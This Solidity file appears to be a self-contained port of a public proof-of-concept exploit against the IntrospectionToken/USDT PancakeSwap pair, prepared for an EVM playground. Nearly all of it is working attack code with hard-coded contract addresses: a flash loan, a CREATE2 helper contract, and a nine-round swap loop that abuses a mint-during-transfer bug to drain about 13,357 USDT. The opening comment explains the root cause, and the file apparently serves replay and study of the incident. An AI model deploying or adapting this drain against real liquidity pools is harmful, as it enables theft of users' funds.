// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-03-IT).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (ContractTest is both the flash-loan recipient AND the pancakeV3FlashCallback
// target, and it deploys a CREATE2 `Money` helper mid-callback), so there is no
// standalone contract to deploy. This is a faithful, self-contained copy of that
// inline attack (testExploit -> pancakeV3FlashCallback -> hack loop, plus the
// Money helper) so the playground can deploy IT_Drain and record run().
// Logic and constants are copied verbatim from test/IT_exp.sol.
//
// Root cause: IntrospectionToken (IT) mints free IT directly to the IT/USDT
// PancakeSwap V2 pair inside _transfer whenever the pair is the sender (i.e. a
// buy). The pair's constant-product check runs AFTER _transfer returns, so it
// sees the post-mint balance and lets the attacker's hand-crafted swap() pull
// out the freshly minted IT plus USDT. Looping the trick 9 times (each time
// depositing 2,000 USDT directly into the pair and swapping out reserve0-1 IT)
// drains ~13,357 USDT from the pair.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2 {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract IT_Drain {
    uint256 constant PRECISION = 10 ** 18;

    IUniPairV3 constant pool = IUniPairV3(0x92b7807bF19b7DDdf89b706143896d05228f3121);
    IUniPairV2 constant IT_USDT = IUniPairV2(0x7265553986a81c838867aA6B3625ABA97B961f00);
    // token0 IT token1 USDT
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant IT = IERC20(0x1AC5Fac863c0a026e029B173f2AE4D33938AB473);

    address immutable self;
    address hack_contract;

    constructor() {
        self = address(this);
    }

    // entrypoint: flash-borrow 2,000 USDT from the PancakeV3 pool; the
    // callback below runs the 9-iteration drain loop.
    function run() external {
        pool.flash(address(this), 2_000_000_000_000_000_000_000, 0, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256, /*fee1*/ bytes memory /*data*/ ) public {
        bytes memory bytecode = type(Money).creationCode;
        uint256 _salt = 0;
        bytecode = abi.encodePacked(bytecode, abi.encode(self));
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
        hack_contract = address(uint160(uint256(hash)));
        USDT.transfer(address(hack_contract), 2_000_000_000_000_000_000_000);
        address addr;
        // Use create2 to send money first.
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
        }
        USDT.transferFrom(hack_contract, address(this), USDT.balanceOf(hack_contract));
        USDT.transfer(address(pool), 2000 ether + fee0);
    }

    function hack(
        address a
    ) public {
        uint256 i = 0;
        while (i < 9) {
            USDT.transferFrom(a, address(IT_USDT), 2_000_000_000_000_000_000_000);
            uint256 pair_balance = IT.balanceOf(address(IT_USDT));
            uint256 usdt_balance = USDT.balanceOf(address(IT_USDT));
            // 0 ->IT  1->USDT
            (uint256 _reserve0, uint256 _reserve1,) = IT_USDT.getReserves();
            uint256 balance0 = mintToPoolIfNeeded(_reserve0 - 1) + 1;
            uint256 balance1 = (
                (_reserve0 * _reserve1 * 10_000 * 10_000) / ((balance0 * 10_000) - (balance0 - 1) * 25)
                    + 2000 ether * 25
            ) / 10_000;
            uint256 amountout = usdt_balance - balance1;
            IT_USDT.swap(_reserve0 - 1, amountout - 1, a, "");
            i++;
        }
    }

    function max(uint256 a, uint256 b) external pure returns (uint256) {
        return a >= b ? a : b;
    }

    function min(uint256 a, uint256 b) external pure returns (uint256) {
        return a <= b ? a : b;
    }

    function feed(
        address a
    ) public {
        USDT.approve(a, type(uint256).max - 1);
    }

    function mintToPoolIfNeeded(
        uint256 amount
    ) public returns (uint256) {
        uint256 tokenUsdtRate;
        (uint112 reserve0, uint112 reserve1,) = IT_USDT.getReserves();

        uint256 tokenReserve;
        uint256 usdtReserve;

        if (address(IT) == IT_USDT.token0()) {
            tokenReserve = uint256(reserve0);
            usdtReserve = uint256(reserve1);
        } else {
            tokenReserve = uint256(reserve1);
            usdtReserve = uint256(reserve0);
        }
        tokenUsdtRate = uint256(usdtReserve) * (PRECISION) / (uint256(tokenReserve));

        uint256 tokenReserveAfterBuy = tokenReserve - amount;
        uint256 usdtReserveAfterBuy =
            this.min(tokenReserve * (usdtReserve) / (tokenReserveAfterBuy), USDT.balanceOf(address(IT_USDT)));

        uint256 maxTokenUsdtRateAfterBuy = tokenUsdtRate + (tokenUsdtRate / (100));

        uint256 tokenMinReserveAfterBuy = usdtReserveAfterBuy * (PRECISION) / (maxTokenUsdtRateAfterBuy);

        if (tokenReserveAfterBuy >= tokenMinReserveAfterBuy) {
            return amount / 2;
        } else {
            return this.max(tokenMinReserveAfterBuy - (tokenReserveAfterBuy), amount / 2);
        }
    }
}

contract Money {
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);

    constructor(
        address _address
    ) {
        USDT.approve(_address, type(uint256).max - 1);
        _address.call(abi.encodeWithSignature("feed(address)", address(this)));
        _address.call(abi.encodeWithSignature("hack(address)", address(this)));
    }
}
